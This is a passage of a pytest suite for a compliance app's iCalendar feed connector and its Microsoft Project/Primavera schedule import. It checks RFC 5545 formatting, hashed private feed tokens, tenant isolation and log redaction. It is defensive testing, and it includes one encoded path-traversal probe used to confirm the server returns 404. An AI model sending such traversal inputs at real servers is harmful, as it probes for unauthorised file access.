"""Calendar feed (app/connectors/calendar_feed.py) and schedule import (app/connectors/schedule_import.py).

Calendar feed: RFC 5545 output (CRLF, 75-octet folding without splitting UTF-8, TEXT escaping, all-day DATE events
with a non-inclusive DTEND, UTC DTSTAMP, DISPLAY VALARMs) checked by a small independent unfolder/parser below; what
the feed holds (lien, stop payment notice, license, insurance, toolbox talk and filing dates, computed by the same
rules as the MCP tools); stable UIDs; the private /cal/<token>.ics link (only its SHA-256 stored, shown once,
revocable, rotatable, 20 per tenant); tenant isolation; roles, CSRF and subscription checks; rate limits; ETag/304;
and that the token never reaches a log.

Schedule import: the three hand-written fixtures in tests/fixtures/schedules (Microsoft Project XML, Primavera P6 XER
and P6 XML, written from the formats documented in the module docstring), hostile XML (DTDs, entity expansion,
external entities, deep nesting), wrong file types, the milestone-to-date mapping (including the completion date
choice when a notice of completion exists), saving rules, the deadline list, and the upload route.

Neither connector calls a vendor API (no outbound HTTP, no operator credentials), so there is no vendor mock: a
mock transport that fails every request proves nothing goes out."""
import hashlib
import logging
import re
from datetime import date, datetime, timedelta, timezone
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient
from starlette.routing import Mount

from app import connectors as registry
from app import dashboard
from app.auth import RateLimiter
from app.connectors import ConnectorContext, validate_connector_class
from app.connectors import calendar_feed as cf
from app.connectors import schedule_import as si
from app.connectors.calendar_feed import CalendarFeedConnector
from app.connectors.schedule_import import ScheduleError, ScheduleImportConnector
from tradecomply import logic, payments
from tests.support import backend, join, make_app, mock_http, signup  # noqa: F401 (backend: autouse)

FIX = Path(__file__).parent / "fixtures" / "schedules"
MSPDI = (FIX / "harbor_lofts_mspdi.xml").read_bytes()
XER = (FIX / "harbor_lofts_p6.xer").read_bytes()
P6XML = (FIX / "mesa_clinic_p6.xml").read_bytes()
TODAY = date(2026, 11, 26)
LICENSE = "123456"                       # in the CSLB demo fixtures the tests run on (tests/conftest.py)
UPLOAD = "/api/integrations/schedule_import/projects/{pid}/upload"


# ---------------------------------------------------------------------------- fixtures
def mount_routes(app):
    """What app/main.py needs: include both routers before the catch-all MCP mount at '/'."""
    app.include_router(cf.router)
    app.include_router(si.router)
    routes = app.router.routes
    catch_all = [r for r in routes if isinstance(r, Mount) and r.path == ""]
    for r in catch_all:
        routes.remove(r)
    routes.extend(catch_all)


@pytest.fixture(autouse=True)
def fresh_limiters(monkeypatch):
    monkeypatch.setattr(cf, "_miss_limiter", RateLimiter(limit=30, window_s=600))
    monkeypatch.setattr(cf, "_feed_limiter", RateLimiter(limit=120, window_s=3600))
    monkeypatch.setattr(si, "_upload_limiter", RateLimiter(limit=30, window_s=3600))


@pytest.fixture
def app(tmp_path):
    a = make_app(tmp_path)
    mount_routes(a)
    a.state.platform.env = {}                    # no operator credentials at all: neither connector needs any
    return a


@pytest.fixture
def platform(app):
    return app.state.platform


@pytest.fixture
def no_network(platform):
    def refuse(request: httpx.Request) -> httpx.Response:
        raise AssertionError(f"unexpected outbound request to {request.url.host}")
    return mock_http(platform, refuse)


@pytest.fixture
def owner(app, no_network):
    with TestClient(app) as c:
        c.tenant_id = signup(c, license_number=LICENSE)["tenant_id"]
        yield c


@pytest.fixture
def other(app, owner):
    with TestClient(app) as c:
        c.tenant_id = signup(c, email="owner@rival.test", company="Rival Electric", license_number="999999")[
            "tenant_id"]
        yield c


def user_client(app, owner, role):
    c = TestClient(app)
    join(c, owner, f"{role}@acme.test", role)
    return c


def new_project(c, **fields) -> dict:
    body = {"name": "Harbor Lofts", "status": "active", **fields}
    r = c.post("/api/projects", json=body)
    assert r.status_code == 201, r.text
    return r.json()


# ---------------------------------------------------------------------------- an independent iCalendar reader
def unfold(body: str) -> list[str]:
    """RFC 5545 3.1: every line ends in CRLF, none is longer than 75 octets, a continuation starts with one space;
    unfolding removes CRLF + that one whitespace character."""
    assert body.endswith("\r\n")
    physical = body[:-2].split("\r\n")
    for line in physical:
        assert "\n" not in line and "\r" not in line, line
        assert len(line.encode("utf-8")) <= 75, line
    out = []
    for line in physical:
        if line[:1] in (" ", "\t"):
            out[-1] += line[1:]
        else:
            out.append(line)
    return out


def unescape(text: str) -> str:
    out, i = [], 0
    while i < len(text):
        ch = text[i]
        if ch == "\\" and i + 1 < len(text):
            nxt = text[i + 1]
            out.append("\n" if nxt in "nN" else nxt)
            i += 2
        else:
            out.append(ch)
            i += 1
    return "".join(out)


def parse_ics(body: str) -> dict:
    """{"props": [(name, params, value)], "events": [{"props": ..., "alarms": [...]}]} for one VCALENDAR."""
    lines = unfold(body)
    assert lines[0] == "BEGIN:VCALENDAR" and lines[-1] == "END:VCALENDAR"
    cal = {"props": [], "events": []}
    stack = [cal]
    for line in lines[1:-1]:
        name_params, _, value = line.partition(":")
        name, *params = name_params.split(";")
        if name == "BEGIN":
            comp = {"type": value, "props": [], "alarms": []}
            (stack[-1]["events"] if value == "VEVENT" else stack[-1]["alarms"]).append(comp)
            stack.append(comp)
        elif name == "END":
            assert stack.pop()["type"] == value
        else:
            stack[-1]["props"].append((name, params, value))
    assert len(stack) == 1
    return cal


def prop(comp: dict, name: str):
    vals = [p for p in comp["props"] if p[0] == name]
    assert len(vals) == 1, (name, vals)
    return vals[0]


def text(comp: dict, name: str) -> str:
    return unescape(prop(comp, name)[2])


# ---------------------------------------------------------------------------- registry and operator setup
def test_both_connectors_discovered_and_valid():
    registry.discover(force=True)
    assert "calendar_feed" not in registry.import_errors and "schedule_import" not in registry.import_errors
    for cls in (CalendarFeedConnector, ScheduleImportConnector):
        assert registry.get(cls.provider) is cls and validate_connector_class(cls) == []
        d = cls.describe({})
        assert d["operator_configured"] is True and cls.required_env == () and d["unconfirmed"]
        assert d["docs_url"].startswith("https://")
    assert CalendarFeedConnector.docs_url == "https://www.rfc-editor.org/rfc/rfc5545"
    assert ScheduleImportConnector.docs_url.startswith("https://learn.microsoft.com/en-us/office-project/")


def test_listed_as_configured_without_any_operator_env(owner, platform):
    platform.env = {}
    body = owner.get("/api/integrations").json()
    views = {p["provider"]: p for p in body["providers"]}
    for provider in ("calendar_feed", "schedule_import"):
        assert views[provider]["operator_configured"] is True and views[provider]["missing_env"] == []
        assert views[provider]["connection"]["status"] in (None, "disconnected")
    assert not body.get("load_errors")


def test_catalog_cards_match_the_connectors():
    import json
    entries = {e["id"]: e for e in json.loads((Path(__file__).parents[1] / "tradecomply" / "data" /
                                              "integrations.json").read_text())["entries"]}
    assert CalendarFeedConnector.catalog_id == "calendar-feed"
    assert "calendar_feed" in entries["calendar-feed"]["builtin"]["providers"]
    for cid in ("oracle-primavera", "microsoft-project"):
        assert "schedule_import" in entries[cid]["builtin"]["providers"]


# ---------------------------------------------------------------------------- RFC 5545 building blocks
def test_escape_text_follows_rfc5545_text_rules():
    assert cf.escape_text("a\\b;c,d\ne") == "a\\\\b\\;c\\,d\\ne"
    assert cf.escape_text("x\r\ny\rz") == "x\\ny\\nz"
    assert cf.escape_text("tab\there\x00\x07\x1b\x7f!") == "tab here!"        # control characters aren't TEXT
    assert cf.escape_text("colon: is fine") == "colon: is fine"
    assert cf.escape_text(None) == ""
    for s in ("Smith, Jones; Annex \\ Phase 2\nline 2", "\\n is not a newline", "ends with \\"):
        assert unescape(cf.escape_text(s)) == s


def test_fold_keeps_lines_within_75_octets_and_never_splits_a_character():
    for line in ("SUMMARY:" + "x" * 200, "DESCRIPTION:" + "Café Ñandú – ✓ " * 30, "SUMMARY:" + "€" * 100,
                 "SUMMARY:" + "a" * 67):
        folded = cf.fold(line)
        parts = folded.split("\r\n")
        assert all(len(p.encode("utf-8")) <= 75 for p in parts)
        assert all(p.startswith(" ") for p in parts[1:])
        assert "".join([parts[0]] + [p[1:] for p in parts[1:]]) == line
        for p in parts:
            p.encode("utf-8").decode("utf-8")                           # each physical line is valid UTF-8
    assert cf.fold("SUMMARY:" + "a" * 67) == "SUMMARY:" + "a" * 67    # exactly 75 octets: not folded
    assert "\r\n " in cf.fold("SUMMARY:" + "a" * 68)


def test_alarm_triggers_fire_at_9am_local_the_given_days_before():
    # An all-day event starts at local midnight; RFC 5545 3.8.6.3: a negative duration is before DTSTART.
    assert cf.trigger_before(7) == "-P6DT15H"
    assert cf.trigger_before(1) == "-PT15H"
    assert cf.trigger_before(30) == "-P29DT15H"
    assert cf.trigger_before(0) == "PT9H"                                # 9 AM on the day itself
    assert cf.reminder_days({"reminders": "14,7,1"}) == (14, 7, 1)
    assert cf.reminder_days({"reminders": "none"}) == ()
    assert cf.reminder_days({}) == (7, 1)
    assert cf.reminder_days({"reminders": "junk"}) == (7, 1)


def test_render_ics_is_a_valid_publish_calendar():
    items = [cf.FeedItem(identity="lien_recording:p1", kind="lien_recording",
                         title="Last day to record a mechanics lien", day=date(2027, 2, 18),
                         detail="Rule applied: 90 days after completion.", category="Lien and payment", project_id=1,
                         project_name="Smith, Jones; Annex \\ Phase 2", citations=["Civil Code 8414"], verified=True,
                         checked_on="2026-11-20", alarms=(7, 1), path="/#/project/1"),
             cf.FeedItem(identity="coi_expiry:s4", kind="coi_expiry", title="Sub insurance certificate (COI) expires",
                         day=date(2026, 12, 31), sub_name="Café Ñandú Electric – Unit ✓ " * 4, alarms=())]
    stamp = datetime(2026, 11, 26, 18, 5, 9, tzinfo=timezone.utc)
    body = cf.render_ics(items, tenant_id="t-1", company_name="Acme, Inc.", stamp=stamp,
                         app_url="https://app.example.test")
    cal = parse_ics(body)
    assert prop(cal, "VERSION")[2] == "2.0" and prop(cal, "PRODID")[2] == cf.PRODID
    assert prop(cal, "METHOD")[2] == "PUBLISH" and prop(cal, "CALSCALE")[2] == "GREGORIAN"
    assert text(cal, "NAME") == "TradeComply: Acme, Inc." == text(cal, "X-WR-CALNAME")
    assert prop(cal, "X-WR-TIMEZONE")[2] == "America/Los_Angeles"
    assert prop(cal, "REFRESH-INTERVAL")[1] == ["VALUE=DURATION"]
    lien, coi = cal["events"]
    for ev in (lien, coi):
        uid = prop(ev, "UID")[2]
        assert re.fullmatch(r"[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}", uid)   # RFC 7986
        assert prop(ev, "DTSTAMP")[2] == "20261126T180509Z"
        assert prop(ev, "DTSTART")[1] == ["VALUE=DATE"] and prop(ev, "DTEND")[1] == ["VALUE=DATE"]
        assert prop(ev, "TRANSP")[2] == "TRANSPARENT"
    assert prop(lien, "DTSTART")[2] == "20270218" and prop(lien, "DTEND")[2] == "20270219"   # DTEND non-inclusive
    assert text(lien, "SUMMARY") == "Last day to record a mechanics lien - Smith, Jones; Annex \\ Phase 2"
    desc = text(lien, "DESCRIPTION")
    assert "Source: Civil Code 8414" in desc and "Verified against the official source on 2026-11-20" in desc
    assert "Not legal advice" in desc and "https://app.example.test/#/project/1" in desc
    assert prop(lien, "URL")[2] == "https://app.example.test/#/project/1"
    assert prop(lien, "CATEGORIES")[2] == "TradeComply,Lien and payment"
    assert [prop(a, "ACTION")[2] for a in lien["alarms"]] == ["DISPLAY", "DISPLAY"]
    assert [prop(a, "TRIGGER")[2] for a in lien["alarms"]] == ["-P6DT15H", "-PT15H"]
    assert all(text(a, "DESCRIPTION") == text(lien, "SUMMARY") for a in lien["alarms"])
    assert coi["alarms"] == [] and "Café Ñandú" in text(coi, "SUMMARY")
    assert "Not yet verified" in text(coi, "DESCRIPTION")
    # same content, new DTSTAMP: same ETag (so a calendar app polling an unchanged feed gets 304)
    later = cf.render_ics(items, tenant_id="t-1", company_name="Acme, Inc.", stamp=stamp + timedelta(hours=3),
                          app_url="https://app.example.test")
    assert later != body and cf.etag_for(later) == cf.etag_for(body)


def test_uids_are_stable_per_tenant_and_identity_and_never_carry_the_date():
    a = cf.event_uid("tenant-a", "lien_recording:p3")
    assert a == cf.event_uid("tenant-a", "lien_recording:p3")
    assert a != cf.event_uid("tenant-b", "lien_recording:p3") != cf.event_uid("tenant-a", "lien_recording:p4")
    assert "tenant" not in a and "lien" not in a


# ---------------------------------------------------------------------------- what the feed holds
def seed(c, platform) -> dict:
    """A subcontractor job with a lender, a GC job with a lender and a toolbox talk, a sub with a COI date and a CSLB
    license, and the opt-in filings and a policy renewal date in the calendar settings."""
    sub_job = new_project(c, name="Harbor Lofts, Bldg A", claimant_role="subcontractor", lender_name="Example Bank",
                          first_furnishing_date="2026-11-10", last_furnishing_date="2026-11-20",
                          completion_date="2026-11-20", start_date="2026-11-02")
    gc_job = new_project(c, name="Mesa Clinic", claimant_role="direct_contractor", lender_name="Coastal Lending",
                         first_furnishing_date="2026-11-16", start_date="2026-11-16")
    r = c.post("/api/field_logs", json={"project_id": gc_job["id"], "kind": "toolbox_talk", "date": "2026-11-18",
                                        "topic": "Ladders"})
    assert r.status_code == 201, r.text
    r = c.post("/api/subs", json={"name": "Example Electric", "license_number": LICENSE, "coi_expiry": "2026-12-15"})
    assert r.status_code == 201, r.text
    sub_id = r.json()["id"]
    r = c.put("/api/integrations/calendar_feed/config", json={"config": {
        "include_filings": True, "entity_type": "corporation", "has_employees": True, "employee_count": 5,
        "wc_policy_renewal_date": "2027-03-01", "reminders": "14,7,1"}})
    assert r.status_code == 200, r.text
    return {"sub_job": sub_job, "gc_job": gc_job, "sub_id": sub_id}


def test_feed_holds_every_kind_of_deadline_with_the_tools_dates(owner, platform):
    s = seed(owner, platform)
    tenant = platform.store.get_tenant(owner.tenant_id)
    inst = CalendarFeedConnector(ConnectorContext(platform, owner.tenant_id))
    items, notes = cf.build_items(platform.store, tenant, inst.config(), TODAY)
    kinds = {i.kind for i in items}
    assert {"prelim_notice", "lien_recording", "lien_foreclosure", "stop_payment_notice", "license_expiry",
            "coi_expiry", "policy_renewal", "toolbox_talk", "filing"} <= kinds, (kinds, notes)
    by_id = {i.identity: i for i in items}
    pid = s["sub_job"]["id"]
    # the same rules as the calculate_lien_deadline and stop_payment_notice_deadline tools
    lien = logic.lien_deadlines("subcontractor", "2026-11-20", "2026-11-10", "2026-11-20", None, today=TODAY,
                                construction_start_date="2026-11-02")
    assert by_id[f"lien_recording:p{pid}"].day.isoformat() == lien.lien_recording_deadline
    assert by_id[f"prelim_notice:p{pid}"].day.isoformat() == lien.preliminary_notice_deadline
    assert by_id[f"lien_foreclosure:p{pid}"].day.isoformat() == lien.foreclosure_deadline_if_recorded_on_last_day
    spn = payments.stop_payment_notice_deadline("private", "subcontractor", completion_date="2026-11-20",
                                                last_furnishing_date="2026-11-20", first_furnishing_date="2026-11-10",
                                                as_of=TODAY, construction_lender=True)
    assert by_id[f"stop_payment_notice:p{pid}"].day.isoformat() == spn.deadline
    gid = s["gc_job"]["id"]
    assert by_id[f"prelim_notice:p{gid}:lender"].day == date(2026, 12, 6)    # 20 days after first furnishing
    expires = dashboard.license_card(LICENSE)["license"]["expiration_date"]
    assert expires and by_id["license_expiry:company"].day.isoformat() == expires
    assert by_id[f"license_expiry:s{s['sub_id']}"].day.isoformat() == expires
    assert by_id["license_expiry:company"].alarms == (30, 14, 7, 1)          # a month's notice for the license
    assert by_id["policy_renewal:wc_policy_renewal_date"].day == date(2027, 3, 1)
    coi = next(i for i in items if i.kind == "coi_expiry")
    assert coi.day == date(2026, 12, 15) and coi.sub_name == "Example Electric"
    assert by_id[f"toolbox_talk:p{gid}"].alarms == (1,)
    assert all(i.day >= TODAY - timedelta(days=cf.PAST_DAYS) for i in items)
    assert len({i.identity for i in items}) == len(items)
    assert not [n for n in notes if n.startswith("Skipped")]


def test_filings_need_opt_in_and_a_business_type(owner, platform):
    tenant = platform.store.get_tenant(owner.tenant_id)
    items, _ = cf.build_items(platform.store, tenant, {}, TODAY)
    assert not [i for i in items if i.kind == "filing"]
    items, notes = cf.build_items(platform.store, tenant, {"include_filings": True}, TODAY)
    assert not [i for i in items if i.kind == "filing"] and any("business type" in n for n in notes)


def test_a_project_with_impossible_dates_does_not_break_the_feed(owner, platform):
    new_project(owner, name="Good job", first_furnishing_date="2026-11-10", last_furnishing_date="2026-11-20")
    bad = new_project(owner, name="Bad job")
    platform.store.update("projects", owner.tenant_id, bad["id"], {"first_furnishing_date": "2026-12-20",
                                                                   "last_furnishing_date": "2026-01-05"})
    tenant = platform.store.get_tenant(owner.tenant_id)
    items, _ = cf.build_items(platform.store, tenant, {}, TODAY)
    assert any(i.kind == "lien_recording" and i.project_name == "Good job" for i in items)
    assert not [i for i in items if i.project_id == bad["id"] and i.kind.startswith("lien")]


def test_a_moved_date_keeps_the_events_uid(owner, platform):
    p = new_project(owner, first_furnishing_date="2026-11-10", last_furnishing_date="2026-11-20")
    link = owner.post("/api/integrations/calendar_feed/links").json()
    path = link["url"].split("://", 1)[1].split("/", 1)[1]

    def lien_event():
        cal = parse_ics(owner.get("/" + path).text)
        return next(e for e in cal["events"] if text(e, "SUMMARY").startswith("Last day to record"))
    before = lien_event()
    r = owner.patch(f"/api/projects/{p['id']}", json={"last_furnishing_date": "2026-11-24"})
    assert r.status_code == 200, r.text
    after = lien_event()
    assert prop(after, "UID") == prop(before, "UID")
    assert prop(after, "DTSTART")[2] != prop(before, "DTSTART")[2]


# ---------------------------------------------------------------------------- private links
def feed_path(url: str) -> str:
    m = re.fullmatch(r"https?://[^/]+(/cal/([A-Za-z0-9_-]{43})\.ics)", url)
    assert m, url
    return m.group(1)


def test_link_lifecycle_token_is_stored_hashed_and_shown_once(owner, platform, caplog):
    caplog.set_level(logging.DEBUG)
    seed(owner, platform)
    r = owner.post("/api/integrations/calendar_feed/links")
    assert r.status_code == 201, r.text
    link = r.json()
    path = feed_path(link["url"])
    token = path[5:-4]
    assert link["webcal_url"] is None or link["webcal_url"] == "webcal://" + link["url"].split("://", 1)[1]
    assert link["id"] == hashlib.sha256(token.encode()).hexdigest()[:12]
    stored = platform.store.list_calendar_tokens(owner.tenant_id)
    assert [t["token_hash"] for t in stored] == [hashlib.sha256(token.encode()).hexdigest()]
    with platform.store.connect() as con:
        rows = [tuple(map(str, r)) for r in con.execute("select * from calendar_tokens").fetchall()]
    assert rows and not any(token in v for row in rows for v in row)
    listed = owner.get("/api/integrations/calendar_feed/links").json()
    assert listed["links"] == [{"id": link["id"], "created": stored[0]["created"]}] and token not in str(listed)
    assert owner.get("/api/integrations/calendar_feed").json()["connection"]["status"] == "connected"

    anon = TestClient(owner.app)                     # a calendar app: no cookie, no key
    r = anon.get(path)
    assert r.status_code == 200
    assert r.headers["content-type"] == "text/calendar; charset=utf-8"
    assert r.headers["x-robots-tag"] == "noindex, nofollow" and r.headers["cache-control"].startswith("private")
    cal = parse_ics(r.text)
    assert len(cal["events"]) >= 8
    assert anon.head(path).status_code == 200
    r2 = anon.get(path, headers={"if-none-match": r.headers["etag"]})
    assert r2.status_code == 304 and not r2.content

    assert owner.delete(f"/api/integrations/calendar_feed/links/{link['id']}").json() == {"ok": True, "active": 0}
    assert anon.get(path).status_code == 404
    assert owner.delete(f"/api/integrations/calendar_feed/links/{link['id']}").status_code == 404
    assert owner.get("/api/integrations/calendar_feed").json()["connection"]["status"] == "disconnected"
    app_logs = [r.getMessage() for r in caplog.records if not r.name.startswith("httpx")]   # not the test client
    assert app_logs and not [m for m in app_logs if token in m]
    audit = owner.get("/api/audit").json()
    tools = [a["tool"] for a in audit]
    assert "integrations.calendar_feed_link_create" in tools and "integrations.calendar_feed_link_revoke" in tools
    assert token not in str(audit)


def test_rotate_revokes_every_link_and_makes_one(owner):
    paths = [feed_path(owner.post("/api/integrations/calendar_feed/links").json()["url"]) for _ in range(3)]
    anon = TestClient(owner.app)
    assert all(anon.get(p).status_code == 200 for p in paths)
    r = owner.post("/api/integrations/calendar_feed/links/rotate").json()
    assert r["revoked"] == 3 and owner.get("/api/integrations/calendar_feed/links").json()["active"] == 1
    assert all(anon.get(p).status_code == 404 for p in paths)
    assert anon.get(feed_path(r["url"])).status_code == 200
    assert owner.delete("/api/integrations/calendar_feed/links").json()["revoked"] == 1
    assert anon.get(feed_path(r["url"])).status_code == 404


def test_link_cap(owner, monkeypatch):
    monkeypatch.setattr(cf, "MAX_LINKS", 2)
    assert [owner.post("/api/integrations/calendar_feed/links").status_code for _ in range(3)] == [201, 201, 409]


def test_generic_connect_test_and_disconnect(owner):
    r = owner.post("/api/integrations/calendar_feed/connect", json={})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["status"] == "connected" and body["test"]["ok"] is True
    path = feed_path("https://x" + body["feed_url"]) if body["feed_url"].startswith("/") else feed_path(
        body["feed_url"])
    anon = TestClient(owner.app)
    assert anon.get(path).status_code == 200
    again = owner.post("/api/integrations/calendar_feed/connect", json={}).json()
    assert "feed_url" not in again                                   # a link exists: no new one is made
    t = owner.post("/api/integrations/calendar_feed/test").json()
    assert t["ok"] is True and t["details"]["active_links"] == 1 and "1 private link" in t["message"]
    assert owner.post("/api/integrations/calendar_feed/disconnect").json()["status"] == "disconnected"
    assert anon.get(path).status_code == 404
    assert owner.get("/api/integrations/calendar_feed/links").json()["active"] == 0


def test_feed_is_tenant_isolated(owner, other):
    new_project(owner, name="Acme Secret Tower", first_furnishing_date="2026-11-10",
                last_furnishing_date="2026-11-20")
    new_project(other, name="Rival Plaza", first_furnishing_date="2026-11-12", last_furnishing_date="2026-11-21")
    mine = owner.post("/api/integrations/calendar_feed/links").json()
    theirs = other.post("/api/integrations/calendar_feed/links").json()
    anon = TestClient(owner.app)
    a, b = anon.get(feed_path(mine["url"])).text, anon.get(feed_path(theirs["url"])).text
    assert "Acme Secret Tower" in a and "Rival Plaza" not in a
    assert "Rival Plaza" in b and "Acme Secret Tower" not in b
    uids_a = {prop(e, "UID")[2] for e in parse_ics(a)["events"]}
    uids_b = {prop(e, "UID")[2] for e in parse_ics(b)["events"]}
    assert not uids_a & uids_b
    # one tenant can't see, revoke or rotate away the other's links
    assert owner.delete(f"/api/integrations/calendar_feed/links/{theirs['id']}").status_code == 404
    owner.post("/api/integrations/calendar_feed/links/rotate")
    owner.delete("/api/integrations/calendar_feed/links")
    assert anon.get(feed_path(theirs["url"])).status_code == 200
    assert other.get("/api/integrations/calendar_feed/links").json()["links"][0]["id"] == theirs["id"]
    events = owner.get("/api/integrations/calendar_feed/events").json()["events"]
    assert events and all("Rival" not in e["summary"] for e in events)


def test_roles_csrf_and_api_keys(app, owner):
    field = user_client(app, owner, "field")
    assert field.post("/api/integrations/calendar_feed/links").status_code == 403
    assert field.get("/api/integrations/calendar_feed/links").status_code == 403
    assert field.get("/api/integrations/calendar_feed/events").status_code == 200        # anyone may read it
    assert field.get("/api/integrations/calendar_feed/calendar.ics").status_code == 200
    no_csrf = TestClient(app, cookies=owner.cookies)
    assert no_csrf.post("/api/integrations/calendar_feed/links").status_code == 403
    assert TestClient(app).post("/api/integrations/calendar_feed/links").status_code == 401
    key = owner.post("/api/keys", json={"name": "agent"}).json()["key"]
    r = TestClient(app).get("/api/integrations/calendar_feed/calendar.ics", headers={"authorization": f"Bearer {key}"})
    assert r.status_code == 200 and r.text.startswith("BEGIN:VCALENDAR\r\n")


def test_lapsed_subscription_stops_the_feed_but_not_revoking(owner, platform):
    link = owner.post("/api/integrations/calendar_feed/links").json()
    platform.store.update_tenant(owner.tenant_id, trial_ends="2000-01-01T00:00:00+00:00")
    anon = TestClient(owner.app)
    assert anon.get(feed_path(link["url"])).status_code == 402
    assert owner.post("/api/integrations/calendar_feed/links").status_code == 402
    assert owner.post("/api/integrations/calendar_feed/links/rotate").status_code == 402
    assert owner.get("/api/integrations/calendar_feed/events").status_code == 402
    assert owner.delete(f"/api/integrations/calendar_feed/links/{link['id']}").status_code == 200


def test_unknown_links_404_and_misses_are_rate_limited_per_address(owner):
    good = feed_path(owner.post("/api/integrations/calendar_feed/links").json()["url"])
    anon = TestClient(owner.app)
    for bad in ("/cal/" + "A" * 43 + ".ics", "/cal/short.ics", "/cal/" + "A" * 44 + ".ics", "/cal/..%2F..%2Fx.ics"):
        assert anon.get(bad).status_code == 404
    codes = [anon.get("/cal/" + "B" * 43 + ".ics").status_code for _ in range(30)]
    assert codes[-1] == 429 and 404 in codes
    assert anon.get(good).status_code == 200            # a valid link is never blocked by someone else's misses


def test_each_link_is_rate_limited(owner, monkeypatch):
    monkeypatch.setattr(cf, "_feed_limiter", RateLimiter(limit=2, window_s=3600))
    path = feed_path(owner.post("/api/integrations/calendar_feed/links").json()["url"])
    anon = TestClient(owner.app)
    codes = [anon.get(path).status_code for _ in range(3)]
    assert codes[:2] == [200, 200] and codes[2] == 429


def test_access_log_redacts_the_token():
    f = cf._RedactFeedPath()
    token = "x" * 43
    rec = logging.LogRecord("uvicorn.access", logging.INFO, __file__, 1, '%s - "%s %s HTTP/%s" %d',
                            ("1.2.3.4:5", "GET", f"/cal/{token}.ics", "1.1", 200), None)
    f.filter(rec)
    assert token not in rec.getMessage() and "/cal/[redacted].ics" in rec.getMessage()
    assert any(getattr(x, "_tc_calendar_redact", False) for x in logging.getLogger("uvicorn.access").filters)
    cf.install_log_filter()                                          # idempotent
    assert sum(getattr(x, "_tc_calendar_redact", False) for x in logging.getLogger("uvicorn.access").filters) == 1


def test_events_view_and_download(owner, platform):
    seed(owner, platform)
    ev = owner.get("/api/integrations/calendar_feed/events").json()
    assert ev["count"] == len(ev["events"]) > 5
    assert all(set(e) >= {"uid", "date", "kind", "summary", "reminders_days_before"} for e in ev["events"])
    assert [e["date"] for e in ev["events"]] == sorted(e["date"] for e in ev["events"])
    r = owner.get("/api/integrations/calendar_feed/calendar.ics")
    assert r.status_code == 200 and len(parse_ics(r.text)["events"]) == ev["count"]


# ---------------------------------------------------------------------------- schedule parsing
def test_parse_date_forms():
    assert si.parse_date("2026-03-02T08:00:00") == date(2026, 3, 2)          # MSPDI / P6 XML
    assert si.parse_date("2026-03-02 08:00") == date(2026, 3, 2)             # XER
    assert si.parse_date("2026-03-02 08.00") == date(2026, 3, 2)             # MPXJ's fallback form
    assert si.parse_date("2026-03-02") == date(2026, 3, 2)
    assert si.parse_date("2026-03-03T05:00:00Z") == date(2026, 3, 2)         # 9 PM the day before in California
    assert si.parse_date("2026-03-02T23:30:00-08:00") == date(2026, 3, 2)
    for bad in ("", None, "soon", "2026-02-30", "1899-01-01", "3000-01-01", "02/03/2026", "2026-03-02T25:00"):
        assert si.parse_date(bad) is None


def test_mspdi_fixture():
    s = si.parse_schedule(MSPDI)
    assert s.format == "mspdi" and s.project_name == "Harbor Lofts - Building A"
    assert s.data_date == date(2026, 11, 20) and s.project_start == date(2026, 3, 2)
    assert [a.uid for a in s.activities] == [str(n) for n in range(1, 10)]   # UID 0 (project task), IsNull skipped
    by = {a.name: a for a in s.activities}
    assert by["Electrical"].kind == "summary" and by["Notice to Proceed"].kind == "milestone"
    rough = by["Electrical rough-in"]
    assert rough.start == date(2026, 4, 13) and rough.actual_start == date(2026, 4, 13)   # not the Baseline's 04-01
    assert rough.code == "3.1" and rough.status == "completed"
    assert "Electrical trim & devices" in by                                 # &amp; decoded
    assert by["Record Notice of Completion"].actual_finish == date(2026, 11, 6)


def test_xer_fixture_projects_and_encoding():
    s = si.parse_schedule(XER)
    assert s.format == "p6_xer" and s.project_code == "HL-A" and s.data_date == date(2026, 11, 20)
    assert len(s.activities) == 10 and {p["code"] for p in s.projects_in_file} == {"HL-A", "HL-GAR"}
    kinds = {a.code: a.kind for a in s.activities}
    assert kinds["A0900"] == "loe" and kinds["E1999"] == "summary" and kinds["A3000"] == "milestone"
    assert any("2 projects" in w for w in s.warnings)
    e2000 = next(a for a in s.activities if a.code == "E2000")
    assert (e2000.planned_start, e2000.actual_start, e2000.actual_finish) == (date(2026, 4, 1), date(2026, 4, 13),
                                                                              date(2026, 6, 19))
    g = si.parse_schedule(XER, "HL-GAR")
    assert g.project_code == "HL-GAR" and [a.code for a in g.activities] == ["G1000", "G1010"]
    assert g.activities[1].name == "Garage deck pour – owner’s inspection"     # Windows-1252 bytes
    assert si.parse_schedule(XER, "4513").project_code == "HL-GAR"
    with pytest.raises(ScheduleError, match="HL-A, HL-GAR"):
        si.parse_schedule(XER, "nope")
    utf8 = XER.decode("cp1252").encode("utf-8")
    assert si.parse_schedule(utf8, "HL-GAR").activities[1].name.endswith("owner’s inspection")


def test_p6_xml_fixture():
    s = si.parse_schedule(P6XML)
    assert s.format == "p6_xml" and s.project_code == "MC-TI" and s.project_name == "Mesa Clinic Tenant Improvement"
    assert s.data_date == date(2026, 11, 16) and len(s.activities) == 8
    kinds = {a.code: a.kind for a in s.activities}
    assert kinds["MC0900"] == "loe" and kinds["MC-WBS"] == "summary" and kinds["MC3000"] == "milestone"
    sub = next(a for a in s.activities if a.code == "MC3000")
    assert sub.finish == date(2027, 2, 5) and sub.actual_finish is None            # the baseline's actual is ignored
    site = si.parse_schedule(P6XML, "MC-SITE")
    assert [a.code for a in site.activities] == ["S1000"]                         # root-level, by ProjectObjectId
    other_version = P6XML.replace(b"/V23.12/", b"/V8.4/")
    assert si.parse_schedule(other_version).project_code == "MC-TI"
    with pytest.raises(ScheduleError, match="not a Primavera P6 XML"):
        si.parse_schedule(P6XML.replace(b"xmlns.oracle.com/Primavera/P6/V23.12", b"example.com/fake"))


def test_the_same_schedule_in_two_formats_maps_the_same():
    for role, words in (("direct_contractor", None), ("subcontractor", "electrical")):
        out = []
        for data in (MSPDI, XER):
            found, _ = si.find_milestones(si.parse_schedule(data), role=role, activity_filter=words, today=TODAY)
            proposed, _ = si.propose_dates(found, {}, role, TODAY)
            out.append({k: (v.date, v.basis) for k, v in proposed.items()})
        assert out[0] == out[1], role


def test_milestone_mapping_for_a_gc_and_a_sub():
    s = si.parse_schedule(MSPDI)
    found, warnings = si.find_milestones(s, role="direct_contractor", activity_filter=None, today=TODAY)
    gc, _ = si.propose_dates(found, {}, "direct_contractor", TODAY)
    assert {k: (v.date.isoformat(), v.basis) for k, v in gc.items()} == {
